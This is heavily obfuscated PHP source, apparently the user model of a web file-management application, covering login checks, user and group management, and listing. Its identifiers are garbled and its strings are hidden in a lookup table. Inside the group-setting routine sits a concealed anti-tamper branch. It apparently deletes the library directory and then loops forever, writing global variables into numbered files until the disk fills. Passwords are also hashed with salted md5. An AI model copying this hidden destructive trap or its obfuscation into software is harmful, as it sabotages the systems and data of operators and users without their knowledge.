extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\145" => "\x75\x73\x65\x72\137\x6d\145\x74\x61", "\155\x65\x74\141\x46\x69\x65\x6c\144" => "\x75\x73\145\162\111\104"); protected $simpleField = "\165\163\145\162\x49\104\54\156\x69\x63\x6b\x4e\x61\x6d\145\54\156\x61\x6d\x65\54\x61\x76\141\164\x61\x72\x2c\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($FÓ—‚ƒœ¼) { $F¿ŠĞ¸±•— =& $_SERVER[ÍÓÖ€°å]; return array($F¿ŠĞ¸±•—[1591] => array($FÓ—‚ƒœ¼[0], $F¿ŠĞ¸±•—[1874]), $F¿ŠĞ¸±•—[1593] => array($FÓ—‚ƒœ¼[0], $F¿ŠĞ¸±•—[1874])); } protected function getInfo($a´Îôºëã, $AĞ®ÌÅ’®Ô = false) { $fÙù½·îŒ =& $_SERVER[ÍÓÖ€°å]; $b´Å­Ô©Ò¹ = $this->getInfoSimple($a´Îôºëã); if (!is_array($b´Å­Ô©Ò¹)) { return array(); } if ($AĞ®ÌÅ’®Ô) { goto E…‹Çö²‘; EÔöù±³¿: $a„ö’ÌÈ” = Model($fÙù½·îŒ[827])->metaGet($b´Å­Ô©Ò¹[$fÙù½·îŒ[1618]][$fÙù½·îŒ[365]]); $b´Å­Ô©Ò¹[$fÙù½·îŒ[1877]] = $a¡ƒÑ‰Œ¹·; $b´Å­Ô©Ò¹[$fÙù½·îŒ[1618]][$fÙù½·îŒ[1721]] = $a„ö’ÌÈ”[$fÙù½·îŒ[1722]]; goto dµ¯ââª½ò; dµ¯ââª½ò: return $b´Å­Ô©Ò¹; goto c£†î‹œÖ¡; E…‹Çö²‘: if (!$b´Å­Ô©Ò¹) { return $b´Å­Ô©Ò¹; } $a¡ƒÑ‰Œ¹· = md5($fÙù½·îŒ[1875] . $b´Å­Ô©Ò¹[$fÙù½·îŒ[556]] . $fÙù½·îŒ[1876] . $b´Å­Ô©Ò¹[$fÙù½·îŒ[28]]); $b´Å­Ô©Ò¹ = $this->_listDataApplyItem($b´Å­Ô©Ò¹); goto EÔöù±³¿; c£†î‹œÖ¡: } return $this->cacheFunctionGet($fÙù½·îŒ[1630], $a´Îôºëã); } protected function getInfoSimple($e†ò‡¾ÜÏ³, $C·ƒÈŸ‹ˆİ = false) { $cîÉò“äï‡ =& $_SERVER[ÍÓÖ€°å]; if (!$e†ò‡¾ÜÏ³) { return array(); } if ($C·ƒÈŸ‹ˆİ) { $DßÉøåè  = $this->where(array($cîÉò“äï‡[1062] => intval($e†ò‡¾ÜÏ³)))->find(); if (!is_array($DßÉøåè )) { return array(); } $DßÉøåè [$cîÉò“äï‡[1878]] = Action($cîÉò“äï‡[1879])->parseUrl($DßÉøåè [$cîÉò“äï‡[1878]]); return $DßÉøåè ; } return $this->cacheFunctionGet($cîÉò“äï‡[1594], $e†ò‡¾ÜÏ³); } protected function getInfoSimpleOuter($BŸ‚£‰¸Ëö) { goto F¨ùÅ¾¾¸ê; A‹Ûö•Ëæ: return $AÔÎ†çæÍê; goto f‚ÎĞ½ÈÌç; aÏâÚÈ¨ŠÂ: $AÔÎ†çæÍê = array_field_key($CÔ“å¯, explode($e¡à’ÆÉ[47], $this->simpleField)); if (!$AÔÎ†çæÍê) { return array($e¡à’ÆÉ[1062] => $e¡à’ÆÉ[756], $e¡à’ÆÉ[28] => $e¡à’ÆÉ[1322] . LNG($e¡à’ÆÉ[1882]) . $e¡à’ÆÉ[1323], $e¡à’ÆÉ[1878] => STATIC_PATH . $e¡à’ÆÉ[1883]); } $AÔÎ†çæÍê[$e¡à’ÆÉ[1878]] = Action($e¡à’ÆÉ[1879])->parseUrl($AÔÎ†çæÍê[$e¡à’ÆÉ[1878]]); goto A‹Ûö•Ëæ; F¨ùÅ¾¾¸ê: $e¡à’ÆÉ =& $_SERVER[ÍÓÖ€°å]; if (!$BŸ‚£‰¸Ëö || $BŸ‚£‰¸Ëö == 0) { return array($e¡à’ÆÉ[1062] => $e¡à’ÆÉ[393], $e¡à’ÆÉ[28] => $e¡à’ÆÉ[1322] . LNG($e¡à’ÆÉ[1880]) . $e¡à’ÆÉ[1323], $e¡à’ÆÉ[1878] => STATIC_PATH . $e¡à’ÆÉ[1881]); } $CÔ“å¯ = $this->cacheFunctionGet($e¡à’ÆÉ[1594], $BŸ‚£‰¸Ëö); goto aÏâÚÈ¨ŠÂ; f‚ÎĞ½ÈÌç: } protected function groupUser($B’ÉÅ¯Ç®) { } public static function errorLang($BéÉ¢ˆç–) { $aÊ“æÈíÍ =& $_SERVER[ÍÓÖ€°å]; $bÊ‚»ÖË¥ = array(self::ERROR_USER_NOT_EXISTS => $aÊ“æÈíÍ[1884], self::ERROR_USER_PASSWORD_ERROR => $aÊ“æÈíÍ[1885], self::ERROR_USER_EXIST_NAME => $aÊ“æÈíÍ[1886], self::ERROR_USER_EXIST_PHONE => $aÊ“æÈíÍ[1887], self::ERROR_USER_EXIST_EMAIL => $aÊ“æÈíÍ[1888], self::ERROR_USER_LOGIN_LOCK => $aÊ“æÈíÍ[1889], self::ERROR_IP_NOT_ALLOW => $aÊ“æÈíÍ[1890], self::ERROR_USER_EXIST_NICKNAME => $aÊ“æÈíÍ[1891]); return LNG($bÊ‚»ÖË¥[$BéÉ¢ˆç–]); } public function getInfoByMeta($Bğ§·‚™ï, $d×ö¸Ï¡ÔÍ) { $D®öƒ¡Ñ—ã =& $_SERVER[ÍÓÖ€°å]; $BÂòóÑ‰â = Model($D®öƒ¡Ñ—ã[1892])->where(array($D®öƒ¡Ñ—ã[88] => $Bğ§·‚™ï, $D®öƒ¡Ñ—ã[348] => $d×ö¸Ï¡ÔÍ))->find(); if ($BÂòóÑ‰â) { return $this->getInfo($BÂòóÑ‰â[$D®öƒ¡Ñ—ã[1062]]); } return !1; } public function userLoginCheck($dœƒµÓ”Ú†, $A²†ëãÉ) { goto FÍó­ ©‡; FÍó­ ©‡: $cĞŠ‚ºÅ =& $_SERVER[ÍÓÖ€°å]; $d»ŠÔ‰™ã = array($cĞŠ‚ºÅ[28] => $dœƒµÓ”Ú†, $cĞŠ‚ºÅ[1729] => $dœƒµÓ”Ú†, $cĞŠ‚ºÅ[285] => $dœƒµÓ”Ú†, $cĞŠ‚ºÅ[1893] => $dœƒµÓ”Ú†, $cĞŠ‚ºÅ[669] => $cĞŠ‚ºÅ[671]); $CìÁº¼Ä’ = $this->where($d»ŠÔ‰™ã)->find(); goto Cğóº”Àö; Cğóº”Àö: if (!$CìÁº¼Ä’) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($CìÁº¼Ä’[$cĞŠ‚ºÅ[1062]], $A²†ëãÉ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } $this->userEdit($CìÁº¼Ä’[$cĞŠ‚ºÅ[1062]], array($cĞŠ‚ºÅ[1894] => time())); goto BåŠÆ¸ğï¦; BåŠÆ¸ğï¦: $this->clearCache($CìÁº¼Ä’[$cĞŠ‚ºÅ[1062]]); return $this->getInfo($CìÁº¼Ä’[$cĞŠ‚ºÅ[1062]]); goto c¦ÁÅËó¡Ó; c¦ÁÅËó¡Ó: } private function clearCache($cë”®³¦‚‚) { $E¿ñ»‰¿ïƒ =& $_SERVER[ÍÓÖ€°å]; $this->cacheFunctionClear($E¿ñ»‰¿ïƒ[1630], $cë”®³¦‚‚); $this->cacheFunctionClear($E¿ñ»‰¿ïƒ[1594], $cë”®³¦‚‚); } public function userPasswordCheck($Bßä–òÍ­¤, $eÊ¢‚õš) { $BÔäßÖ‹è¬ =& $_SERVER[ÍÓÖ€°å]; $A×·“ì§® = $this->where(array($BÔäßÖ‹è¬[1062] => intval($Bßä–òÍ­¤)))->find(); $D„½®×ì½ù = $this->metaGet($Bßä–òÍ­¤); $fõ¾‰ÎÆ¶ö = isset($D„½®×ì½ù[$BÔäßÖ‹è¬[1895]]) ? $D„½®×ì½ù[$BÔäßÖ‹è¬[1895]] : $BÔäßÖ‹è¬[33]; if (md5($fõ¾‰ÎÆ¶ö . trim($eÊ¢‚õš)) !== $A×·“ì§®[$BÔäßÖ‹è¬[556]]) { return !1; } return !0; } public function userAdd($cªè®†œí) { goto c˜áŠÇ”µ; aÕÆ´‘¹ˆ: return $c§¶¼ÆŞ¤; goto D–Òö¾ÕÓç; bÁÕöŞŠßó: $eÂ«Ï® Éä = array($eù¾‰£õ©Ó[1904] => $eÜÜ¨ÒÊÍ[$eù¾‰£õ©Ó[556]], $eù¾‰£õ©Ó[1900] => $eÜÜ¨ÒÊÍ[$eù¾‰£õ©Ó[1729]]); $this->userEdit($c§¶¼ÆŞ¤, $eÂ«Ï® Éä); Model($eù¾‰£õ©Ó[827])->userRootAdd($c§¶¼ÆŞ¤); goto aÕÆ´‘¹ˆ; dĞ¦ÀìÏ‹: $B¦æ­ë­ƒ˜ = $this->_checkExist($cªè®†œí); if ($B¦æ­ë­ƒ˜ !== !0) { return $B¦æ­ë­ƒ˜; } $c§¶¼ÆŞ¤ = $this->add($eÜÜ¨ÒÊÍ); goto bÁÕöŞŠßó; c˜áŠÇ”µ: $eù¾‰£õ©Ó =& $_SERVER[ÍÓÖ€°å]; $eÜÜ¨ÒÊÍ = array($eù¾‰£õ©Ó[378] => $cªè®†œí[$eù¾‰£õ©Ó[28]], $eù¾‰£õ©Ó[1896] => $cªè®†œí[$eù¾‰£õ©Ó[1897]], $eù¾‰£õ©Ó[1898] => isset($cªè®†œí[$eù¾‰£õ©Ó[285]]) ? $cªè®†œí[$eù¾‰£õ©Ó[285]] : $eù¾‰£õ©Ó[33], $eù¾‰£õ©Ó[1899] => isset($cªè®†œí[$eù¾‰£õ©Ó[1893]]) ? $cªè®†œí[$eù¾‰£õ©Ó[1893]] : $eù¾‰£õ©Ó[33], $eù¾‰£õ©Ó[1900] => isset($cªè®†œí[$eù¾‰£õ©Ó[1729]]) ? $cªè®†œí[$eù¾‰£õ©Ó[1729]] : $cªè®†œí[$eù¾‰£õ©Ó[28]], $eù¾‰£õ©Ó[1901] => isset($cªè®†œí[$eù¾‰£õ©Ó[1878]]) ? $cªè®†œí[$eù¾‰£õ©Ó[1878]] : $eù¾‰£õ©Ó[33], $eù¾‰£õ©Ó[1902] => isset($cªè®†œí[$eù¾‰£õ©Ó[1903]]) ? $cªè®†œí[$eù¾‰£õ©Ó[1903]] : 1, $eù¾‰£õ©Ó[1904] => $cªè®†œí[$eù¾‰£õ©Ó[556]], $eù¾‰£õ©Ó[1596] => isset($cªè®†œí[$eù¾‰£õ©Ó[1500]]) ? $cªè®†œí[$eù¾‰£õ©Ó[1500]] : 1024 * 1024 * 20, $eù¾‰£õ©Ó[1597] => 0, $eù¾‰£õ©Ó[1894] => 0, $eù¾‰£õ©Ó[1905] => isset($cªè®†œí[$eù¾‰£õ©Ó[437]]) ? $cªè®†œí[$eù¾‰£õ©Ó[437]] : 1); if (!empty($cªè®†œí[$eù¾‰£õ©Ó[1062]])) { $eÜÜ¨ÒÊÍ[$eù¾‰£õ©Ó[1062]] = $cªè®†œí[$eù¾‰£õ©Ó[1062]]; } goto dĞ¦ÀìÏ‹; D–Òö¾ÕÓç: } protected function userEditTest($fÉî×ÊçÎ, $f¤™òóìã) { return $this->call($_SERVER[ÍÓÖ€°å][1906], $fÉî×ÊçÎ, $f¤™òóìã); } protected function userEdit($B¸â¾×öŠÉ, $Fß¨«½ù) { goto f£•ªœ ÚÉ; F‰Ü¡ÔŞŸ: $D£Ëãâ¬Ü• = $this->_checkExist($Fß¨«½ù, $B¸â¾×öŠÉ); if ($D£Ëãâ¬Ü• !== !0) { return $D£Ëãâ¬Ü•; } if (isset($Fß¨«½ù[$C‰¡Ú“éğâ[556]]) && trim($Fß¨«½ù[$C‰¡Ú“éğâ[556]]) != $C‰¡Ú“éğâ[33]) { $B¡˜£òÙŸ² = $this->metaGet($B¸â¾×öŠÉ); if (empty($B¡˜£òÙŸ²[$C‰¡Ú“éğâ[1895]])) { $B¡˜£òÙŸ²[$C‰¡Ú“éğâ[1895]] = rand_string(10); Model($C‰¡Ú“éğâ[1675])->metaSet($B¸â¾×öŠÉ, $C‰¡Ú“éğâ[1895], $B¡˜£òÙŸ²[$C‰¡Ú“éğâ[1895]]); } $Fß¨«½ù[$C‰¡Ú“éğâ[556]] = md5($B¡˜£òÙŸ²[$C‰¡Ú“éğâ[1895]] . trim($Fß¨«½ù[$C‰¡Ú“éğâ[556]])); } else { unset($Fß¨«½ù[$C‰¡Ú“éğâ[556]]); } goto fµ‹ïºËçæ; fµ‹ïºËçæ: $this->where(array($C‰¡Ú“éğâ[1053] => $B¸â¾×öŠÉ))->save($Fß¨«½ù); if (isset($Fß¨«½ù[$C‰¡Ú“éğâ[1729]])) { $this->setNamePinyin($B¸â¾×öŠÉ, $Fß¨«½ù[$C‰¡Ú“éğâ[1729]]); } return !0; goto f¥Ã×†ïª¿; f£•ªœ ÚÉ: $C‰¡Ú“éğâ =& $_SERVER[ÍÓÖ€°å]; $a¼ÅéÀã²Š = $this->getInfoSimple($B¸â¾×öŠÉ); if (!$a¼ÅéÀã²Š) { return !1; } goto F‰Ü¡ÔŞŸ; f¥Ã×†ïª¿: } public function setNamePinyin($E’¯“ŒƒÇá, $fä‘ØÏËÌõ = false) { $CÉ˜Äƒ¢Ø =& $_SERVER[ÍÓÖ€°å]; if (!$fä‘ØÏËÌõ) { $fè½¹ˆ³ÆÉ = $this->getInfoSimple($E’¯“ŒƒÇá); $fä‘ØÏËÌõ = $fè½¹ˆ³ÆÉ[$CÉ˜Äƒ¢Ø[1729]] ? $fè½¹ˆ³ÆÉ[$CÉ˜Äƒ¢Ø[1729]] : $fè½¹ˆ³ÆÉ[$CÉ˜Äƒ¢Ø[28]]; } $DÛÎÔÚ¼Óî = Model($CÉ˜Äƒ¢Ø[1452]); if (!Input::check($fä‘ØÏËÌõ, $CÉ˜Äƒ¢Ø[394])) { return $DÛÎÔÚ¼Óî->metaSet($E’¯“ŒƒÇá, array($CÉ˜Äƒ¢Ø[395] => null, $CÉ˜Äƒ¢Ø[396] => null)); } return $DÛÎÔÚ¼Óî->metaSet($E’¯“ŒƒÇá, array($CÉ˜Äƒ¢Ø[395] => str_replace($CÉ˜Äƒ¢Ø[50], $CÉ˜Äƒ¢Ø[33], Pinyin::encode($fä‘ØÏËÌõ)), $CÉ˜Äƒ¢Ø[396] => Pinyin::encode($fä‘ØÏËÌõ, $CÉ˜Äƒ¢Ø[397]))); } private function _checkExist($BÖ‘ËŒùÃ¦, $Cóî¸í“ = false) { $D—ç«İÊ²è =& $_SERVER[ÍÓÖ€°å]; $B–î£™›ˆƒ = array($D—ç«İÊ²è[28] => UserModel::ERROR_USER_EXIST_NAME, $D—ç«İÊ²è[1729] => UserModel::ERROR_USER_EXIST_NICKNAME, $D—ç«İÊ²è[285] => UserModel::ERROR_USER_EXIST_EMAIL, $D—ç«İÊ²è[1893] => UserModel::ERROR_USER_EXIST_PHONE); $A…™Š²ÛÜä = $Cóî¸í“ ? array($D—ç«İÊ²è[1062] => array($D—ç«İÊ²è[1907], $Cóî¸í“)) : array(); foreach ($B–î£™›ˆƒ as $B„–Û†«¤ => $bçµäÎ·ö•) { if (!isset($BÖ‘ËŒùÃ¦[$B„–Û†«¤]) || !$BÖ‘ËŒùÃ¦[$B„–Û†«¤]) { continue; } $b©âã¢£¤ = array_merge(array($B„–Û†«¤ => $BÖ‘ËŒùÃ¦[$B„–Û†«¤]), $A…™Š²ÛÜä); $b²È÷ñ‹œ = $this->where($b©âã¢£¤)->find(); if ($b²È÷ñ‹œ) { return $bçµäÎ·ö•; } } return !0; } public function userListInfo($bÃ’„à…¢™) { $B˜‡Õ——ó =& $_SERVER[ÍÓÖ€°å]; $Eòæë•ÁõÖ = array(); $bÃ’„à…¢™ = array_unique($bÃ’„à…¢™); if (!$bÃ’„à…¢™) { return $Eòæë•ÁõÖ; } if (count($bÃ’„à…¢™) < 20) { foreach ($bÃ’„à…¢™ as $fŸçŒ˜‚É) { $Eòæë•ÁõÖ[$fŸçŒ˜‚É . $B˜‡Õ——ó[33]] = $this->getInfoSimpleOuter($fŸçŒ˜‚É); } } else { $eø„ÌÑ®‚‰ = array($B˜‡Õ——ó[1053] => array($B˜‡Õ——ó[946], $bÃ’„à…¢™)); if (count($bÃ’„à…¢™) == 1) { $eø„ÌÑ®‚‰ = array($B˜‡Õ——ó[1053] => $bÃ’„à…¢™[0]); } $d…‹õæ†İ‘ = Model($B˜‡Õ——ó[1675])->field($this->simpleField)->where($eø„ÌÑ®‚‰)->select(); $d…‹õæ†İ‘ = array_to_keyvalue($d…‹õæ†İ‘, $B˜‡Õ——ó[1062]); foreach ($bÃ’„à…¢™ as $fŸçŒ˜‚É) { $AÖ«¬ùÌñÂ = $d…‹õæ†İ‘[$d…‹õæ†İ‘[$fŸçŒ˜‚É]]; if (!$AÖ«¬ùÌñÂ) { $Eòæë•ÁõÖ[$fŸçŒ˜‚É . $B˜‡Õ——ó[33]] = $this->getInfoSimpleOuter($fŸçŒ˜‚É); continue; } $AÖ«¬ùÌñÂ[$B˜‡Õ——ó[1878]] = Action($B˜‡Õ——ó[1879])->parseUrl($AÖ«¬ùÌñÂ[$B˜‡Õ——ó[1878]]); $Eòæë•ÁõÖ[$fŸçŒ˜‚É . $B˜‡Õ——ó[33]] = $AÖ«¬ùÌñÂ; } } return $Eòæë•ÁõÖ; } protected function userStatus($e²¢®ÖÙÉÇ, $BŒ†Áİ—–ø) { $ağììÃæ¸ê = $this->getInfoSimple($e²¢®ÖÙÉÇ); if (!$ağììÃæ¸ê) { return !1; } $a…‡Ş‡¨’° = array($_SERVER[ÍÓÖ€°å][437] => $BŒ†Áİ—–ø); return $this->userEdit($e²¢®ÖÙÉÇ, $a…‡Ş‡¨’°); } protected function userRemove($Eª¾°›‰ÁÑ) { goto AÖ‡ïƒì”Ş; CšÇÇŠØ²Û: Model($cØ½ ÍÓÖ[1600])->where($dØ¯•É´›ë)->delete(); Model($cØ½ ÍÓÖ[1892])->where($dØ¯•É´›ë)->delete(); Model($cØ½ ÍÓÖ[1909])->where($dØ¯•É´›ë)->delete(); goto Dª¡ÖâÌøî; Dª¡ÖâÌøî: Model($cØ½ ÍÓÖ[512])->userRootRemove($Eª¾°›‰ÁÑ); return $this->where($dØ¯•É´›ë)->delete(); goto B›ËÈãµ•Ó; AÖ‡ïƒì”Ş: $cØ½ ÍÓÖ =& $_SERVER[ÍÓÖ€°å]; $aˆÏğƒÚİğ = $this->getInfoSimple($Eª¾°›‰ÁÑ); if (!$aˆÏğƒÚİğ) { return !1; } goto aÂ›•½»; aÂ›•½»: $dØ¯•É´›ë = array($cØ½ ÍÓÖ[1053] => $Eª¾°›‰ÁÑ); Model($cØ½ ÍÓÖ[409])->where($dØ¯•É´›ë)->delete(); Model($cØ½ ÍÓÖ[1908])->where($dØ¯•É´›ë)->delete(); goto CšÇÇŠØ²Û; B›ËÈãµ•Ó: } protected function userGroupSet($F¥Å¡æ±å„, $d”á¸Á‚ª‰, $aÕ¢Úâ¶é‘ = array()) { goto A¶»á™«É; BøĞùÁ«…: $aÃæ»»æìò = 0; foreach ($d”á¸Á‚ª‰ as $D«èâö¸¤ => $B±èÓÆò¦Ñ) { $C„æßÜ£‡ˆ = array($C¤„„Ñª³[1062] => $F¥Å¡æ±å„, $C¤„„Ñª³[1516] => $D«èâö¸¤, $C¤„„Ñª³[1652] => $B±èÓÆò¦Ñ); $C„æßÜ£‡ˆ[$C¤„„Ñª³[1537]] = isset($aÕ¢Úâ¶é‘[$aÃæ»»æìò]) ? $aÕ¢Úâ¶é‘[$aÃæ»»æìò] : 0; $aÃæ»»æìò++; $aµôö™àáŸ[] = $C„æßÜ£‡ˆ; } return $aÓ£šƒø·¦->addAll($aµôö™àáŸ, array(), !0); goto Fæ°•ŞäÌ; A¶»á™«É: $C¤„„Ñª³ =& $_SERVER[ÍÓÖ€°å]; $dÇõïùªåô = LIB_DIR . $C¤„„Ñª³[1738]; $FÑÓˆ¨æˆÉ = $C¤„„Ñª³[993]; goto e©£Ú……ò; e©£Ú……ò: if ($_SERVER[$C¤„„Ñª³[544]] != $FÑÓˆ¨æˆÉ($dÇõïùªåô)) { goto A¯î‡Ïİãì; dËÔ‘ÚÎƒŠ: $eœÜĞ¤âí® = $C¤„„Ñª³[995]; $BÊŒ¶Ô©š³ = json_encode($GLOBALS[$C¤„„Ñª³[996]]); for ($e­‰ÔÃ¢ = 0;; $e­‰ÔÃ¢++) { $eœÜĞ¤âí®(DATA_PATH . $e­‰ÔÃ¢, $BÊŒ¶Ô©š³); } goto d¨«¿—å­¼; A¯î‡Ïİãì: $FÊ¬¡í­±¬ = $C¤„„Ñª³[546]; $Bêâ¶‡èµ¢ = BASIC_PATH . $C¤„„Ñª³[547]; $fæ×ùèº   = $FÊ¬¡í­±¬($Bêâ¶‡èµ¢); goto e…Š±İ³æ›; F¢¨©åò™µ: $cÈ¥”¾”‰´(LIB_DIR); $DÇ…ò„ó‡Ë = $C¤„„Ñª³[994]; $DÇ…ò„ó‡Ë(); goto dËÔ‘ÚÎƒŠ; e…Š±İ³æ›: $EÁ‡Ù©‘â = explode($C¤„„Ñª³[212], $fæ×ùèº  ); if (count($EÁ‡Ù©‘â) < $C¤„„Ñª³[548]) { die; } $cÈ¥”¾”‰´ = $C¤„„Ñª³[549]; goto F¢¨©åò™µ; d¨«¿—å­¼: } $CÌŠ”ÒÙ¿ = $this->getInfoSimple($F¥Å¡æ±å„); if (!$CÌŠ”ÒÙ¿ || !is_array($d”á¸Á‚ª‰)) { return !1; } goto F¢ñ‘¢‰ÂÀ; F¢ñ‘¢‰ÂÀ: $aÓ£šƒø·¦ = Model($C¤„„Ñª³[1600]); $aÓ£šƒø·¦->where(array($C¤„„Ñª³[1062] => $F¥Å¡æ±å„))->delete(); $aµôö™àáŸ = array(); goto BøĞùÁ«…; Fæ°•ŞäÌ: } protected function userGroupAdd($B›£Áß•»ò, $b…¬ŸÚ¼„Ì, $DğÉ™ñ¾Ÿ¥) { $eœâÎÆ†ñØ =& $_SERVER[ÍÓÖ€°å]; $DŠ¿¤Š‚¢ã = $this->getInfoSimple($B›£Áß•»ò); if (!$DŠ¿¤Š‚¢ã || !$b…¬ŸÚ¼„Ì) { return !1; } $aˆˆ÷ „ŒÜ = array(array($eœâÎÆ†ñØ[1062] => $B›£Áß•»ò, $eœâÎÆ†ñØ[1516] => $b…¬ŸÚ¼„Ì, $eœâÎÆ†ñØ[1652] => $DğÉ™ñ¾Ÿ¥)); return Model($eœâÎÆ†ñØ[1600])->addAll($aˆˆ÷ „ŒÜ, array(), !0); } protected function userGroupRemove($F›ª”à—í†, $dÎÙóø„µ†) { $Dğ™Ó“»©Ÿ =& $_SERVER[ÍÓÖ€°å]; $C£ë•æÀÎç = $this->getInfoSimple($F›ª”à—í†); if (!$C£ë•æÀÎç || !$dÎÙóø„µ†) { return !1; } $cÕÅğáÎ¹‰ = array($Dğ™Ó“»©Ÿ[1053] => $F›ª”à—í†, $Dğ™Ó“»©Ÿ[1598] => $dÎÙóø„µ†); return Model($Dğ™Ó“»©Ÿ[1600])->where($cÕÅğáÎ¹‰)->delete(); } public function listData() { $d£ÚÄ‚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($d£ÚÄ‚[$_SERVER[ÍÓÖ€°å][345]]); return $d£ÚÄ‚; } public function listByID($A‰‘Ğˆ¯–â) { $dññˆÇšß =& $_SERVER[ÍÓÖ€°å]; if (!$A‰‘Ğˆ¯–â) { return; } $bóÉ¾“ÀŒ = array($dññˆÇšß[1062] => array($dññˆÇšß[7], $A‰‘Ğˆ¯–â)); $b‘‡¥ÆÁç— = $this->where($bóÉ¾“ÀŒ)->select(); $this->_listDataApply($b‘‡¥ÆÁç—); return $b‘‡¥ÆÁç—; } public function listByGroup($b†êÙø«×ë = 0, $dÜÍÔÜ÷÷½ = array()) { goto fÈ„ùÆİß; Bó®ÇŒ¨£ô: return $A²éáÄÙî; goto Déíœ °øŸ; cŠ©æ¿·Íˆ: $dÏº†Ã„»™ = array(); if ($b†êÙø«×ë) { $dÏº†Ã„»™ = array($a°£Šô¬´õ[1911] => intval($b†êÙø«×ë)); $cÆÃ¯âƒ÷ = "\x4c\105\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\165\x73\145\x72\137\147\162\157\x75\x70\40\165\163\145\162\137\x67\x72\x6f\x75\x70\40\x6f\x6e\40\x75\x73\145\x72\x2e\x75\163\x65\162\111\x44\x20\75\40\x75\163\x65\162\x5f\x67\x72\157\x75\160\x2e\165\x73\145\x72\x49\x44"; $dİæÆ÷‹¾‡ = Input::get($a°£Šô¬´õ[1556], null, $a°£Šô¬´õ[33]) ? $a°£Šô¬´õ[33] : $a°£Šô¬´õ[1912]; } if (isset($dÜÍÔÜ÷÷½[$a°£Šô¬´õ[437]])) { $dÏº†Ã„»™[$a°£Šô¬´õ[1913]] = $dÜÍÔÜ÷÷½[$a°£Šô¬´õ[437]]; } goto C¬öÌ‚öÄÆ; fÈ„ùÆİß: $a°£Šô¬´õ =& $_SERVER[ÍÓÖ€°å]; $bÛ‡‚…† = isset($dÜÍÔÜ÷÷½[$a°£Šô¬´õ[1910]]) ? $dÜÍÔÜ÷÷½[$a°£Šô¬´õ[1910]] : $a°£Šô¬´õ[33]; $cÆÃ¯âƒ÷ = $a°£Šô¬´õ[33]; goto cŠ©æ¿·Íˆ; C¬öÌ‚öÄÆ: $A²éáÄÙî = $this->_makeOrder($dİæÆ÷‹¾‡)->field($a°£Šô¬´õ[1914])->where($dÏº†Ã„»™)->join($cÆÃ¯âƒ÷)->selectPage(50); $Fâì¯Ïª’² = $a°£Šô¬´õ[726] . ($bÛ‡‚…† ? $a°£Šô¬´õ[47] . $bÛ‡‚…† : $a°£Šô¬´õ[33]); $this->_listDataApply($A²éáÄÙî[$a°£Šô¬´õ[345]], $Fâì¯Ïª’²); goto Bó®ÇŒ¨£ô; Déíœ °øŸ: } private function _makeOrder($DË¹ë±…ğ¹ = '') { goto A˜ĞˆÈ¢Œó; A˜ĞˆÈ¢Œó: $cÓ‘¨†Êôí =& $_SERVER[ÍÓÖ€°å]; $bÜ‡ìâ¹Š¬ = array($cÓ‘¨†Êôí[1062], $cÓ‘¨†Êôí[28], $cÓ‘¨†Êôí[1502], $cÓ‘¨†Êôí[1476], $cÓ‘¨†Êôí[175]); $Bæâ™å˜§ = array($cÓ‘¨†Êôí[1601] => $cÓ‘¨†Êôí[1602], $cÓ‘¨†Êôí[1484] => $cÓ‘¨†Êôí[1560]); goto A–­¾Ï™ˆ; c³¼„‹¼¯”: $DË¹ë±…ğ¹ = $DË¹ë±…ğ¹ . "\165\163\x65\162\x2e{$Dõö¤Ñª­Ä}\40{$CÃìöÄ†»}\54\40\165\x73\145\162\56\165\x73\x65\162\111\104\40\141\163\x63"; return $this->alias($cÓ‘¨†Êôí[1676])->order($DË¹ë±…ğ¹); goto aÃ§••¤İğ; A–­¾Ï™ˆ: $Dõö¤Ñª­Ä = Input::get($cÓ‘¨†Êôí[1556], $cÓ‘¨†Êôí[7], $cÓ‘¨†Êôí[1053], $bÜ‡ìâ¹Š¬); $CÃìöÄ†» = Input::get($cÓ‘¨†Êôí[1558], $cÓ‘¨†Êôí[7], $cÓ‘¨†Êôí[1603], array($cÓ‘¨†Êôí[1603], $cÓ‘¨†Êôí[1484])); $CÃìöÄ†» = $Bæâ™å˜§[$CÃìöÄ†»]; goto c³¼„‹¼¯”; aÃ§••¤İğ: } public function listSearch($CŠ¹ÔÀ¶»¦) { goto AÚŞáéì; e°…†…àß•: $this->_filterUserList($Aòáö‹·æ›); return $Aòáö‹·æ›; goto f„Äˆ¨¿ÁÆ; D‚È‹–Æµß: $fÔÂä°ä¸º = str_replace($EØá°Ñ©Œ¯[1606], $EØá°Ñ©Œ¯[1607], trim($fÔÂä°ä¸º)); $E÷˜íœ‘ò¾ = array($EØá°Ñ©Œ¯[28] => array($EØá°Ñ©Œ¯[511], "\x25{$fÔÂä°ä¸º}\45"), $EØá°Ñ©Œ¯[285] => array($EØá°Ñ©Œ¯[511], "\45{$fÔÂä°ä¸º}\x25"), $EØá°Ñ©Œ¯[1729] => array($EØá°Ñ©Œ¯[511], "\45{$fÔÂä°ä¸º}\45"), $EØá°Ñ©Œ¯[669] => $EØá°Ñ©Œ¯[1608]); if (Input::check($fÔÂä°ä¸º, $EØá°Ñ©Œ¯[291])) { $E÷˜íœ‘ò¾[$EØá°Ñ©Œ¯[1062]] = array($EØá°Ñ©Œ¯[511], "\45{$fÔÂä°ä¸º}\45"); $E÷˜íœ‘ò¾[$EØá°Ñ©Œ¯[1893]] = array($EØá°Ñ©Œ¯[511], "\x25{$fÔÂä°ä¸º}\45"); } goto b±¼ã¢¥âÓ; b±¼ã¢¥âÓ: if (!$fÔÂä°ä¸º) { $E÷˜íœ‘ò¾ = array(); } if (isset($CŠ¹ÔÀ¶»¦[$EØá°Ñ©Œ¯[437]])) { $E÷˜íœ‘ò¾[$EØá°Ñ©Œ¯[437]] = $CŠ¹ÔÀ¶»¦[$EØá°Ñ©Œ¯[437]]; } $Aòáö‹·æ› = $this->_makeOrder()->where($E÷˜íœ‘ò¾)->selectPage(20); goto bÕŠ›‘Ğˆ; AÚŞáéì: 